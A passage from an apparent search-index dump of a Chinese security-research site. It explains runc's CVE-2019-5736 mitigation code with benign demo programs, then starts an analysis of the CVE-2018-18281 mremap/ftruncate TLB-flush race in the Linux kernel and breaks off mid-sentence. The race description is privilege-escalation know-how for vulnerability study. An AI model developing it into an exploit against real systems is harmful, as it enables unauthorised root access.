            "text": "\u5c1d\u8bd5\u5c06 /proc/self/exe \u901a\u8fc7bind mount\u7684\u65b9\u5f0fbind\u5230\u4e00\u4e2a\u4e34\u65f6\u6587\u4ef6 /tmp/runc.xxxxxx  static int try_bindfd(void)\n{\n  ...\n\u00a0 fd = mkstemp(template);\n  ...   \n  ret = -EPERM;\n\u00a0 if (mount(\"/proc/self/exe\", template, \"\", MS_BIND, \"\") < 0)\n        goto out;\n\u00a0\u00a0\n  ...\n  if (mount(\"\", template, \"\", MS_REMOUNT | MS_BIND | MS_RDONLY, \"\") < 0)\n        goto out_umount;\n\u00a0\u00a0\n\u00a0 ...\n  ret = open(template, O_PATH | O_CLOEXEC);\nout_umount:\n    ...\n    if (umount2(template, MNT_DETACH) < 0) {\n        if (ret >= 0)\n            close(ret);\n        ret = -ENOTRECOVERABLE;\n    }\n\u00a0\u00a0\nout:\n    ...\n    unlink(template);\n    return ret;\n}\n\u00a0\u00a0  \u4e00\u4e2a\u6d4b\u8bd5Demo:  #define _GNU_SOURCE\n#include <sys/mount.h>\n#include <time.h>\n#include <stdio.h>\n#include <sys/types.h>\u00a0 \u00a0\n#include <sys/stat.h>\u00a0 \u00a0\u00a0\n#include <fcntl.h>\n#include <stdlib.h>\nint main(){\n    char template[1024] = \"./target.XXXXXX\";\n    int fd = mkstemp(template);\n    printf(\"%d\\n\", fd);\n    mount(\"/proc/self/exe\", template, \"\", MS_BIND, \"\") ;\n    mount(\"\", template, \"\", MS_REMOUNT | MS_BIND | MS_RDONLY, \"\");\n    int ret = open(template, O_PATH | O_CLOEXEC);\n    printf(\"%d\\n\", ret);\n    sleep(20);\n    umount2(template, MNT_DETACH);\n    printf(\"umounted\\n\");\n    sleep(1000);\n}\n\n/*\n$ sudo ./mount_umount_demo\u00a0\n3\n4\n\n$ ls -l\n...\n-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 mount_umount_demo\n-rw-r--r-- 1 invincible invincible\u00a0 551 Apr 14 20:39 mount_umount_demo.c\n-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 target.xIAgUt\n\n$ sudo ./mount_umount_demo\u00a0\n3\n4\numounted\n\n$ ls -l\n...\n-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 mount_umount_demo\n-rw-r--r-- 1 invincible invincible\u00a0 551 Apr 14 20:39 mount_umount_demo.c\n-rw------- 1 root\u00a0 \u00a0 \u00a0 \u00a0root\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 0 Apr 14 20:40 target.xIAgUt\ninvincible@ubuntu:~/Desktop/test/mount_test$\u00a0\n*/",
            "title": "clone_binary-&gt;try_bindfd"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#clone_binary-make_execfd",
            "text": "\u8fd9\u4e2a\u65b9\u6848\u4e2dmake_execfd\u521b\u5efa\u5185\u5b58\u6587\u4ef6\u4e5f\u6709\u4e09\u79cd\u65b9\u5f0f\uff1a   \u901a\u8fc7 memfd_create   #define RUNC_MEMFD_COMMENT \"runc_cloned:/proc/self/exe\"\n#ifndef MFD_CLOEXEC\n#\u00a0 define MFD_CLOEXEC\u00a0 \u00a0 \u00a0 \u00a00x0001U\n#\u00a0 define MFD_ALLOW_SEALING 0x0002U\n#endif\nstatic int make_execfd(int *fdtype)\n{\n    *fdtype = EFD_MEMFD;\n\n    fd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);\n\n    if (fd >= 0)\n        return fd;  \u5173\u4e8e memfd_create \uff1a  memfd_create() creates an anonymous file and returns a file\ndescriptor that refers to it.  The file behaves like a regular file,\nand so can be modified, truncated, memory-mapped, and so on.\nHowever, unlike a regular file, it lives in RAM and has a volatile\nbacking storage.  \u53c2\u8003\uff1a  https://cloud.tencent.com/developer/article/1551288   \u901a\u8fc7open \u8bbe\u7f6e O_TMPFILE  flag\u7684\u65b9\u5f0f\u521b\u5efa\u4e34\u65f6\u6587\u4ef6       *fdtype = EFD_FILE;\n    fd = open(prefix, O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, 0700);\n    if (fstat(fd, &statbuf) >= 0)\n\u00a0 \u00a0 working_otmpfile = (statbuf.st_nlink == 0);\n    if (working_otmpfile)\n    \u00a0 return fd;  \u5173\u4e8eopen\u51fd\u6570\u7684 O_TMPFILE \u6807\u5fd7\uff1a  O_TMPFILE (since Linux 3.11)\n\u00a0 \u00a0 Create an unnamed temporary regular file.\u00a0 The pathname argu\u2010\n\u00a0 \u00a0 ment specifies a directory; an unnamed inode will be created\n\u00a0 \u00a0 in that directory's filesystem.\u00a0 Anything written to the\n\u00a0 \u00a0 resulting file will be lost when the last file descriptor is\n\u00a0 \u00a0 closed, unless the file is given a name.   \u901a\u8fc7mkostemp+unlink       /*\n     * Our final option is to create a temporary file the old-school way, and\n     * then unlink it so that nothing else sees it by accident.\n     */\n    *fdtype = EFD_FILE;\n    fd = mkostemp(template, O_CLOEXEC);\n    if (fd >= 0) {\n        if (unlink(template) >= 0)\n            return fd;  \u5173\u4e8e mkostemp \uff1a\u7b80\u5355\u7684\u521b\u5efa\u4e00\u4e2a\u552f\u4e00\u540d\u79f0\u7684\u4e34\u65f6\u6587\u4ef6\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528 open \u51fd\u6570\u7684\u90e8\u5206flag  \u5173\u4e8eunlink:  unlink() deletes a name from the filesystem.\u00a0 If that name was the\nlast link to a file and no processes have the file open, the file is\ndeleted and the space it was using is made available for reuse.",
            "title": "clone_binary-&gt;make_execfd"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#clone_binary-seal_execfd",
            "text": "\u5f53 make_execfd \u4e2d\u901a\u8fc7 memfd_create \u6210\u529f\u521b\u5efa\u4e86\u5185\u5b58\u6587\u4ef6\u65f6   \u901a\u8fc7 fcntl \u4e3a\u6587\u4ef6\u6dfb\u52a0 seals \uff0c\u5177\u4f53\u662f\u4f7f\u8be5\u5185\u5b58\u7a7a\u95f4\u4e0d\u53ef\u6269\u5927\u548c\u7f29\u5c0f\uff0c\u4e0d\u53ef\u5199\u5165\uff0c\u4e14\u8be5\u9650\u5236\u4e0d\u53ef\u4fee\u6539\uff1a  #ifndef F_SEAL_SEAL\n#  define F_SEAL_SEAL   0x0001 /* prevent further seals from being set */\n#  define F_SEAL_SHRINK 0x0002 /* prevent file from shrinking */\n#  define F_SEAL_GROW   0x0004 /* prevent file from growing */\n#  define F_SEAL_WRITE  0x0008 /* prevent writes */\n#endif\n#define RUNC_MEMFD_SEALS \\\n    (F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)\nstatic int seal_execfd(int *fd, int fdtype)\n{\n    switch (fdtype) {\n    case EFD_MEMFD:\n        return fcntl(*fd, F_ADD_SEALS, RUNC_MEMFD_SEALS);   \u5982\u679c\u662f\u901a\u8fc7\u540e\u4e24\u79cd\u65b9\u5f0f\u521b\u5efa\u7684\u5185\u5b58\u6587\u4ef6( open  \u8bbe\u7f6e O_TMPFILE \u6216\u8005 mkostemp+unlink )   \u4f1a\u91cd\u65b0\u4f7f\u7528 open \u8bbe\u7f6e O_PATH  flag\u6253\u5f00\u4e00\u6b21\uff0c\u8fd9\u662f\u4e3a\u4e86\u8ba9 execve \u53ef\u7528\u3002      case EFD_FILE: {\n        /* Need to re-open our pseudo-memfd as an O_PATH to avoid execve(2) giving -ETXTBSY. */\n        int newfd;\n        char fdpath[PATH_MAX] = {0};\n        if (fchmod(*fd, 0100) < 0)\n            return -1;\n        if (snprintf(fdpath, sizeof(fdpath), \"/proc/self/fd/%d\", *fd) < 0)\n            return -1;\n        newfd = open(fdpath, O_PATH | O_CLOEXEC);\n        if (newfd < 0)\n            return -1;\n        close(*fd);\n        *fd = newfd;\n        return 0;\n    }\n    default:\n    \u00a0 \u00a0break;\n    }\n    return -1;\n}  \u5173\u4e8e open  \u7684 O_PATH  flag\uff1a  O_PATH (since Linux 2.6.39)\n    ...\n\u00a0 \u00a0 One use of O_PATH for regular files is to provide the\n\u00a0 \u00a0 equivalent of POSIX.1's O_EXEC functionality.\u00a0 This permits us\n\u00a0 \u00a0 to open a file for which we have execute permission but not\n\u00a0 \u00a0 read permission, and then execute that file, with steps\n\u00a0 \u00a0 something like the following:\n\u00a0 \u00a0 char buf[PATH_MAX];\n\u00a0 \u00a0 fd = open(\"some_prog\", O_PATH);\n\u00a0 \u00a0 snprintf(buf, PATH_MAX, \"/proc/self/fd/%d\", fd);\n\u00a0 \u00a0 execl(buf, \"some_prog\", (char *) NULL);\n\n\u00a0 \u00a0 An O_PATH file descriptor can also be passed as the argument\n\u00a0 \u00a0 of fexecve(3).  demo1:  //\u6f14\u793acreate_memfd + fexecve\u7684\u65b9\u5f0f\n// \u6ca1\u6709\u505a\u5f02\u5e38\u5904\u7406\n#define _GNU_SOURCE\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/sendfile.h>\n#include <sys/mman.h>\n#include <sys/syscall.h>\n#define RUNC_MEMFD_COMMENT \"runc_cloned:/proc/self/exe\"\n#ifndef F_SEAL_SEAL\n#\u00a0 define F_SEAL_SEAL\u00a0 \u00a00x0001  /* prevent further seals from being set */\n#\u00a0 define F_SEAL_SHRINK 0x0002  /* prevent file from shrinking */\n#\u00a0 define F_SEAL_GROW\u00a0 \u00a00x0004  /* prevent file from growing */\n#\u00a0 define F_SEAL_WRITE\u00a0 0x0008  /* prevent writes */\n#endif\n#define RUNC_MEMFD_SEALS \\\n    (F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)\n\n#ifndef F_LINUX_SPECIFIC_BASE\n#\u00a0 define F_LINUX_SPECIFIC_BASE 1024\n#endif\n#ifndef F_ADD_SEALS\n#\u00a0 define F_ADD_SEALS (F_LINUX_SPECIFIC_BASE + 9)\n#\u00a0 define F_GET_SEALS (F_LINUX_SPECIFIC_BASE + 10)\n#endif\n\n/* Use our own wrapper for memfd_create. */\n#if !defined(SYS_memfd_create) && defined(__NR_memfd_create)\n#\u00a0 define SYS_memfd_create __NR_memfd_create\n#endif\n/* memfd_create(2) flags -- copied from <linux/memfd.h>. */\n#ifndef MFD_CLOEXEC\n#\u00a0 define MFD_CLOEXEC\u00a0 \u00a0 \u00a0 \u00a00x0001U\n#\u00a0 define MFD_ALLOW_SEALING 0x0002U\n#endif\nint memfd_create(const char *name, unsigned int flags)\n{\n#ifdef SYS_memfd_create\n    return syscall(SYS_memfd_create, name, flags);\n#else\n    errno = ENOSYS;\n    return -1;\n#endif\n}\n\nint main(int argc, char *argv[]){\n    if(argc > 1){\n        if(strcmp(argv[1], \"stage2\") == 0){ \n            printf(\"Stage 2 ok\\n\");\n            return 0;\n        }\n        else{\n            return -1;\n        }\n    }   \n    // \u901a\u8fc7memfd_create\u521b\u5efa\u5185\u5b58\u6587\u4ef6\n    int fd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);\n    printf(\"%d\\n\", fd);\n    // \u628a/proc/self/exe \u590d\u5236\u5230 memfd_create\u521b\u5efa\u7684\u5185\u5b58\u6587\u4ef6\n    int exefd = open(\"/proc/self/exe\", O_RDONLY | O_CLOEXEC);\n    size_t sent = 0;\n    struct stat statbuf = {};\n    fstat(exefd, &statbuf);\n    while (sent < statbuf.st_size) {\n        int n = sendfile(fd, exefd, NULL, statbuf.st_size - sent);\n        sent += n;\n    }\n    close(exefd);\n    printf(\"sent: %ldbytes\\n\", sent);\n    // \u6dfb\u52a0seals\u7ea6\u675f    \n    if(fcntl(fd, F_ADD_SEALS, RUNC_MEMFD_SEALS) < 0){\n        perror(\"fcntl error\");\n    }\n    // \u6267\u884cstage2\n    char *env[] = {NULL};\n    char *argv2[] = {\"\", \"stage2\", NULL};\n    fexecve(fd, argv2, env);\n    perror(\"fexecve error\");\n}\n/*\n$ gcc memfd_create_demo.c -o memfd\n$ ./memfd\u00a0\n3\nsent: 9288bytes\nStage 2 ok\n*/  demo2:  // \u6f14\u793aopen O_TEMPFILE + open O_PATH + fexecve\u7684\u65b9\u5f0f\n// \u6ca1\u6709\u505a\u5f02\u5e38\u5904\u7406\n#define _GNU_SOURCE\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n\u00a0#include <sys/sendfile.h>\nint main(int argc, char *argv[]){\n    if(argc > 1){\n        if(strcmp(argv[1], \"stage2\") == 0){ \n            printf(\"Stage 2 ok\\n\");\n            return 0;\n        }\n        else{\n            return -1;\n        }\n    }\n    struct stat statbuf = {};\n    size_t sent = 0;\n    char **environ;\n    char *argv2[] = {\"opath\", \"stage2\", NULL};\n    int fd = open(\"./\", O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, 0700);\n    int exefd = open(\"/proc/self/exe\", O_RDONLY | O_CLOEXEC);\n    fstat(exefd, &statbuf);\n    while (sent < statbuf.st_size) {\n        int n = sendfile(fd, exefd, NULL, statbuf.st_size - sent);\n        sent += n;\n    }\n    close(exefd);\n    fchmod(fd, 0100);\n    char fdpath[1024];\n    snprintf(fdpath, sizeof(fdpath), \"/proc/self/fd/%d\", fd);\n    int newfd = open(fdpath, O_PATH | O_CLOEXEC);\n    close(fd);\n    fexecve(newfd, argv2, environ);\n    // fexecve(fd, argv2, environ);\n    perror(\"fexecve error\");\n}\n/*\n$ gcc open_opath_demo.c -o opath\n$ ./opath\u00a0\nStage 2 ok\n*/",
            "title": "clone_binary-&gt;seal_execfd"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/",
            "text": "TLB \u7f13\u5b58\u5ef6\u8fdf\u5237\u65b0\u6f0f\u6d1e(cve-2018-18281)\u89e3\u6790\n\n\n0.\u4f5c\u8005\n\n\n\uff08chengjia4574@gmail.com, iceswordlab)\n\n\n1.\u80cc\u666f\u4ecb\u7ecd\n\n\na.\u4ec0\u4e48\u8f6f\u4ef6\u7684\u6f0f\u6d1e\n\n\nlinux kernel \u5185\u5b58\u7ba1\u7406\u5b50\u7cfb\u7edf\u7684\u6f0f\u6d1e\n\n\nb.\u8fd9\u4e2a\u8f6f\u4ef6\u7684\u7b80\u4ecb\n\n\nlinux \u5185\u6838\u901a\u8fc7 \n\u591a\u7ea7\u9875\u8868\n \u5b9e\u73b0\u865a\u62df\u5185\u5b58\u673a\u5236, \u4e3a\u4e86\u63d0\u9ad8\u8bbf\u95ee\u901f\u5ea6, \u4e00\u4e9b\u6620\u5c04\u4fe1\u606f\u4f1a\u88ab\u7f13\u5b58\u5728 \nTLB\n \u91cc, cpu \u5728\u8bbf\u95ee\u4e00\u4e2a\u865a\u62df\u5730\u5740\u7684\u65f6\u5019, \u4f1a\u5148\u67e5\u627e TLB , \u5982\u679c\u6ca1\u6709\u547d\u4e2d, \u624d\u53bb\u904d\u5386\u4e3b\u5b58\u91cc\u7684\u591a\u7ea7\u9875\u8868, \u5e76\u5c06\u67e5\u627e\u5230\u7684\u6620\u5c04\u5173\u7cfb\u586b\u5165 TLB\n\n\n\u53cd\u8fc7\u6765, \u5982\u679c\u67d0\u4e2a\u6620\u5c04\u5173\u7cfb\u8981\u89e3\u9664, \u9664\u4e86\u5728\u4e3b\u5b58\u91cc\u7684\u76f8\u5173\u8868\u9879\u8981\u5220\u9664, \u8fd8\u9700\u8981\u5bf9\u591a\u4e2acpu core \u540c\u6b65\u6267\u884c TLB \u5237\u65b0, \u4f7f\u5f97\u5728\u6240\u6709 TLB \u7f13\u5b58\u91cc\u8be5\u6620\u5c04\u5173\u7cfb\u6d88\u9664, \u5426\u5219\u5c31\u4f1a\u51fa\u73b0\u4e0d\u4e00\u81f4. \n\n\n\u672c\u6f0f\u6d1e\u5c31\u8ddf\u4e0a\u8ff0\u673a\u5236\u6709\u5173.\n\n\nc.\u6f0f\u6d1e\u80fd\u9020\u6210\u4ec0\u4e48\u5371\u5bb3\n\n\n\u6743\u9650\u63d0\u5347\n\n\nd.\u5176\u4ed6\u5bf9\u4e86\u89e3\u6f0f\u6d1e\u6709\u5229\u7684\u80cc\u666f\u77e5\u8bc6\n\n\n\n\nmremap\n \n\n\nftruncate\n \n\n\n\u591a\u7ea7\u9875\u8868\n\n\nTLB\n\n\nTLBs, Paging-Structure Caches, and Their Invalidation\n\n\nReverse Engineering Hardware Page Table Caches\n\n\n\u4f19\u4f34\u7cfb\u7edf\n\n\n\u8fdb\u7a0b\u62a2\u5360\n\n\nsched_setaffinity\n\n\nsched_setscheduler\n\n\n\n\n2.\u6f0f\u6d1e\u5206\u6790\n\n\na.\u6f0f\u6d1e\u539f\u7406\u7cbe\u51c6\u6982\u62ec\n\n\nlinux kernel TLB \u7f13\u5b58\u6ca1\u6709\u53ca\u65f6\u5237\u65b0\u9020\u6210\u865a\u62df\u5730\u5740\u590d\u7528, \u53ef\u4ee5\u5b9e\u73b0\u8f83\u4e3a\u7a33\u5b9a\u7684\u63d0\u6743\u5229\u7528\n\n\nb.\u6f0f\u6d1e\u539f\u7406\n\n\n\u5148\u770b\u4e24\u4e2a\u7cfb\u7edf\u8c03\u7528\n\n\n\n\nmremap\n \u7cfb\u7edf\u8c03\u7528\u7528\u6765\u6539\u53d8\u865a\u62df\u5185\u5b58\u7684\u6620\u5c04\u533a\u57df\n\n\nftruncate\n \u7cfb\u7edf\u8c03\u7528\u7528\u6765\u6539\u53d8\u6587\u4ef6\u7684\u5927\u5c0f\u5230\u6307\u5b9a\u5927\u5c0f\n\n\n\n\n\u8fd9\u4e24\u4e2a\u7cfb\u7edf\u8c03\u7528\u8868\u9762\u4e0a\u770b\u516b\u7aff\u5b50\u6253\u4e0d\u7740, \u4f46\u5728 linux \u5185\u6838\u7684\u5b9e\u73b0\u91cc, \u4ed6\u4eec\u7684\u8c03\u7528\u94fe\u6761\u4f1a\u51fa\u73b0\u4e00\u4e2a\u7ade\u6001\u6761\u4ef6\u5f02\u5e38\n\n\n1) sys_mremap() -> mremap_to()->move_vma()->move_page_tables(). \nmove_page_tables() first calls move_ptes() in a loop, \nthen performs a TLB flush with flush_tlb_range().\n\n2) sys_ftruncate()->do_sys_ftruncate()->do_truncate()->notify_change()\n->shmem_setattr()->unmap_mapping_range()->unmap_mapping_range_tree()\n->unmap_mapping_range_vma() ->zap_page_range_single()->unmap_single_vma()\n->unmap_page_range()->zap_pud_range()->zap_pmd_range()->zap_pte_range()\ncan concurrently access the page tables of a process that is in move_page_tables(), \nbetween the move_ptes() loop and the TLB flush.\n\n\n\n\nmremap \u5e95\u5c42\u5b9e\u73b0\u4e3b\u8981\u662f move_ptes \u51fd\u6570\n\n\n89 static void move_ptes(struct vm_area_struct *vma, pmd_t *old_pmd,\n90                 unsigned long old_addr, unsigned long old_end,\n91                 struct vm_area_struct *new_vma, pmd_t *new_pmd,\n92                 unsigned long new_addr, bool need_rmap_locks)\n93 {\n94         struct address_space *mapping = NULL;\n95         struct anon_vma *anon_vma = NULL;\n96         struct mm_struct *mm = vma->vm_mm;\n97         pte_t *old_pte, *new_pte, pte;\n98         spinlock_t *old_ptl, *new_ptl;\n======================== skip ======================\n133         old_pte = pte_offset_map_lock(mm, old_pmd, old_addr, &old_ptl);\n134         new_pte = pte_offset_map(new_pmd, new_addr);\n135         new_ptl = pte_lockptr(mm, new_pmd);\n136         if (new_ptl != old_ptl)\n137                 spin_lock_nested(new_ptl, SINGLE_DEPTH_NESTING);\n138         arch_enter_lazy_mmu_mode();\n139 \n140         for (; old_addr < old_end; old_pte++, old_addr += PAGE_SIZE,\n141                                    new_pte++, new_addr += PAGE_SIZE) {\n142                 if (pte_none(*old_pte))\n143                         continue;\n144                 pte = ptep_get_and_clear(mm, old_addr, old_pte);\n145                 pte = move_pte(pte, new_vma->vm_page_prot, old_addr, new_addr);\n146                 pte = move_soft_dirty_pte(pte);\n147                 set_pte_at(mm, new_addr, new_pte, pte);\n148         }\n149 \n150         arch_leave_lazy_mmu_mode();\n151         if (new_ptl != old_ptl)\n152                 spin_unlock(new_ptl);\n153         pte_unmap(new_pte - 1);\n154         pte_unmap_unlock(old_pte - 1, old_ptl);\n155         if (anon_vma)\n156                 anon_vma_unlock_write(anon_vma);\n157         if (mapping)\n158                 i_mmap_unlock_write(mapping);\n159 }\n\n\n\n\n\u7ed3\u5408\u4e0a\u9762\u4ee3\u7801, \u6709\u4e24\u70b9\u9700\u8981\u6ce8\u610f\n\n\n\n\n\u9501, 133 ~ 137 \u8fd9\u51e0\u884c\u76ee\u7684\u662f\u83b7\u53d6 pmd (pmd \u6307\u9488\u6307\u5411\u4e00\u4e2a\u5b58\u6ee1\u4e86 pte \u7ed3\u6784\u7684\u9875\u9762) \u7684\u9501 (\u5305\u62ec\u65e7\u7684\u548c\u65b0\u7684), 151 ~ 154 \u8fd9\u51e0\u884c\u662f\u91ca\u653e pmd \u9501\n\n\nptes \u62f7\u8d1d, \u5bf9\u4e00\u4e2a pmd \u91cc\u7684\u6240\u6709 pte \u6267\u884c\u62f7\u8d1d\u64cd\u4f5c, 144 \u8fd9\u4e00\u884c\u8c03\u7528 ptep_get_and_clear \u5c06 old_pte \u7684\u503c\u8d4b\u503c\u7ed9\u4e34\u65f6\u53d8\u91cf pte \u5e76\u6e05\u7a7a\u65e7\u7684\u9875\u8868\u9879, 147 \u8fd9\u4e00\u884c\u8c03\u7528 set_pte_at \u5c06\u521a\u521a\u7684 pte \u8d4b\u503c\u7ed9 new_pte \u6307\u9488\n\n\n\n\n\u7b80\u5355\u800c\u8a00, move_ptes \u5c06\u65e7\u7684 pmd \u9875\u7684\u503c ( ptes ) \u62f7\u8d1d\u5230\u4e86\u65b0\u7684 pmd \u9875, \u8fd9\u5c31\u662f mremap \u51fd\u6570\u5728\u5e95\u5c42\u7684\u5b9e\u73b0, \u5b83\u5e76\u4e0d\u9700\u8981\u5220\u9664\u65e7\u5730\u5740\u5bf9\u5e94\u7684 pages, \u53ea\u9700\u8981\u5c06\u65e7\u5730\u5740\u5173\u8054\u5230\u7684 ptes \u62f7\u8d1d\u5230\u65b0\u5730\u5740\u5173\u8054\u7684\u9875\u8868, \u8fd9\u79cd\u62f7\u8d1d\u662f\u6309\u7167 pmd \u4e3a\u5355\u4f4d\u8fdb\u884c\u7684, \u6bcf\u5904\u7406\u5b8c\u4e00\u4e2a pmd, \u5bf9\u5e94\u7684 pmd lock \u5c31\u4f1a\u91ca\u653e.\n\n\nftruncate \u51fd\u6570\u5c06\u6587\u4ef6\u5927\u5c0f\u53d8\u4e3a\u6307\u5b9a\u7684\u5927\u5c0f, \u5982\u679c\u65b0\u7684\u503c\u6bd4\u65e7\u7684\u503c\u5c0f, \u5219\u9700\u8981\u5c06\u6587\u4ef6\u5728\u5185\u5b58\u7684\u865a\u5b58\u7a7a\u95f4\u53d8\u5c0f, \u8fd9\u9700\u8981\u8c03\u7528\u5230 zap_pte_range \u51fd\u6570\n\n\n1107 static unsigned long zap_pte_range(struct mmu_gather *tlb,\n1108                                 struct vm_area_struct *vma, pmd_t *pmd,\n1109                                 unsigned long addr, unsigned long end,\n1110                                 struct zap_details *details)\n1111 {          \n1112         struct mm_struct *mm = tlb->mm;\n1113         int force_flush = 0;\n1114         int rss[NR_MM_COUNTERS];\n1115         spinlock_t *ptl;\n1116         pte_t *start_pte;\n1117         pte_t *pte;\n1118         swp_entry_t entry;\n1119 \n1120 again:\n1121         init_rss_vec(rss);\n1122         start_pte = pte_offset_map_lock(mm, pmd, addr, &ptl);\n1123         pte = start_pte;\n1124         flush_tlb_batched_pending(mm);\n1125         arch_enter_lazy_mmu_mode();\n1126         do {\n1127                 pte_t ptent = *pte;\n========================== skip ==========================\n1146                         ptent = ptep_get_and_clear_full(mm, addr, pte,\n1147                                                         tlb->fullmm);\n1148                         tlb_remove_tlb_entry(tlb, pte, addr);\n========================== skip ==========================\n1176                 entry = pte_to_swp_entry(ptent);\n========================== skip ==========================\n1185                 if (unlikely(!free_swap_and_cache(entry)))\n1186                         print_bad_pte(vma, addr, ptent, NULL);\n1187                 pte_clear_not_present_full(mm, addr, pte, tlb->fullmm);\n1188         } while (pte++, addr += PAGE_SIZE, addr != end);\n1189 \n1190         add_mm_rss_vec(mm, rss);\n1191         arch_leave_lazy_mmu_mode();\n1192 \n1193         /* Do the actual TLB flush before dropping ptl */\n1194         if (force_flush)\n1195                 tlb_flush_mmu_tlbonly(tlb);\n1196         pte_unmap_unlock(start_pte, ptl);\n========================== skip ==========================\n1212         return addr;\n1213 }\n\n\n\n\n\u7ed3\u5408\u4e0a\u9762\u4ee3\u7801, \u6709\u4e09\u70b9\u9700\u8981\u6ce8\u610f, \n\n\n\n\n\u9501, 1122 \u884c\u83b7\u53d6\u4e86 pmd \u7684\u9501, 1196 \u884c\u91ca\u653e\u4e86 pmd \u7684\u9501, \u8fd9\u91cc\u7684 pmd \u9501\u8ddf move_ptes \u51fd\u6570\u91cc\u7684\u662f\u540c\u4e00\u4e2a\u4e1c\u897f\n\n\npte, 1146 \u884c\u6e05\u7a7a\u4e86\u9875\u8868\u9879\n\n\npage, 1185 \u884c\u8c03\u7528\u51fd\u6570 free_swap_and_cache \u91ca\u653e\u4e86 pte \u5bf9\u5e94\u7684 page cache, \u5c06\u7269\u7406\u9875\u9762\u91ca\u653e, \u8fd9\u662f\u4e0e move_ptes \u4e0d\u540c\u7684\u5730\u65b9\n\n\n\n\n\u5c06\u4e0a\u8ff0\u4e24\u4e2a\u51fd\u6570\u7684\u6d41\u7a0b\u653e\u5230\u4e00\u8d77\u5206\u6790, \u5047\u8bbe\u4e0b\u9762\u8fd9\u79cd\u60c5\u51b5:\n\n\n\u5047\u8bbe\u4e00\u4e2a\u8fdb\u7a0b\u6709 A,B,C \u4e09\u4e2a\u7ebf\u7a0b:\n\n\n\n\n1) A \u6620\u5c04\u4e00\u4e2a\u6587\u4ef6 a \u5230\u5730\u5740 X, \u6620\u5c04\u6761\u4ef6\u4e3a: PROT_READ , MAP_SHARED\n\n\n2) C \u5faa\u73af\u8bfb\u53d6 X \u7684\u5185\u5bb9\n\n\n3) A \u8c03\u7528 mremap \u91cd\u65b0\u6620\u5c04 X \u5230 Y, \u8fd9\u4e2a\u8c03\u7528\u4f1a\u6267\u884c\u4e0b\u9762\u4e24\u4e2a\u51fd\u6570:\n\n\n3.1) move_ptes , \u8be5\u51fd\u6570\u505a\u5982\u4e0b\u64cd\u4f5c:\n\n\n3.1.1) \u83b7\u53d6 X \u9875\u8868\u548c Y \u9875\u8868\u7684\u9501\n\n\n3.1.2) \u904d\u5386 X \u5bf9\u5e94\u9875\u8868\u7684 pte , \u91ca\u653e\u4e4b, \u5e76\u5728 Y \u9875\u8868\u91cd\u5efa\u8fd9\u4e9b pte \n\n\n3.1.3) \u91ca\u653e Y \u9875\u8868\u7684\u9501\n\n\n3.1.4) \u91ca\u653e X \u9875\u8868\u7684\u9501\n\n\n\n\n\n\n3.2) flush_tlb_range : \u5237\u65b0 X \u5bf9\u5e94\u7684 TLB \u7f13\u5b58 \n\n\n\n\n\n\n4) B \u8c03\u7528 ftruncate \u5c06\u6587\u4ef6 a \u7684\u6587\u4ef6\u5927\u5c0f\u6539\u4e3a 0, \u8fd9\u4e2a\u8c03\u7528\u4f1a\u6267\u884c\u4e0b\u9762\u64cd\u4f5c:\n\n\n4.1) \u83b7\u53d6 Y \u9875\u8868\u7684\u9501\n\n\n4.2) \u5220\u9664 Y \u5bf9\u5e94\u7684\u9875\u8868\n\n\n4.3) \u91ca\u653e Y \u5bf9\u5e94\u7684 pages\n\n\n4.4) \u5237\u65b0 Y \u5bf9\u5e94\u7684 TLB \u7f13\u5b58\n\n\n\n\n\n\n\n\n\u8bf4\u660e: \n\n\u5b9e\u9645\u4e0a X \u548c Y \u662f\u4e24\u5757\u5185\u5b58\u533a\u57df, \u4e5f\u5c31\u662f\u8bf4\u53ef\u80fd\u6bd4\u4e00\u4e2a pmd \u6240\u5bb9\u7eb3\u7684\u5730\u5740\u8303\u56f4\u5927, \n\u4e0d\u7ba1\u662f mremap \u8fd8\u662f ftruncate, \u5e95\u5c42\u5b9e\u73b0\u4f1a\u5c06 X \u548c Y \u6309\u7167 pmd \u4e3a\u5355\u4f4d\u5faa\u73af\u6267\u884c\u4e0a\u8868\u7684\u64cd\u4f5c, \n\u5373\u4e0a\u8868\u6240\u8bf4\u7684 X \u9875\u8868\u5b9e\u9645\u6307\u7684\u662f X \u5185\u5b58\u533a\u57df\u91cc\u7684\u67d0\u4e2a pmd, \u8fd9\u91cc\u662f\u4e3a\u4e86\u8868\u8fbe\u65b9\u4fbf\u7b80\u5316\u5904\u7406, \n\u4e0b\u9762\u7684\u63cf\u8ff0\u4e5f\u662f\u4e00\u6837.\n\n\n\n\n\u8fd9\u91cc\u5b58\u5728\u7684\u7ade\u6001\u6761\u4ef6\u662f\u5f53 4.3 \u5df2\u7ecf\u6267\u884c\u5b8c\u6bd5 (3.1.3 \u91ca\u653e Y \u9501 4.1 \u5c31\u53ef\u4ee5\u6267\u884c), \u5730\u5740 Y \u7684\u5185\u5b58\u5df2\u7ecf\u91ca\u653e, \u7269\u7406\u9875\u9762\u5df2\u7ecf\u8fd4\u56de\u7ed9 \n\u4f19\u4f34\u7cfb\u7edf\n , \u5e76\u518d\u4e00\u6b21\u5206\u914d\u7ed9\u65b0\u7684\u865a\u62df\u5185\u5b58, \u800c\u6b64\u65f6 3.2 \u8fd8\u6ca1\u6709\u6267\u884c, \u8fd9\u79cd\u60c5\u51b5\u4e0b, \u867d\u7136 X 